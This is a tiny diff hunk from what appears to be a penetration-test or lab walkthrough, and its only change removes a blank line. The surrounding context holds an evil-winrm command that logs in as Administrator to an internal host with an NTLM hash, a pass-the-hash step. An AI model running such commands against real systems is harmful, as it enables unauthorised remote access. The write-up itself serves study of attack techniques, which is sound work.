@@ -3027,7 +3027,6 @@ ssmallsadm@MGMT01:~$
 
 Dowloading the poc on kali:
 
-
 ```bash
 evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
                                         
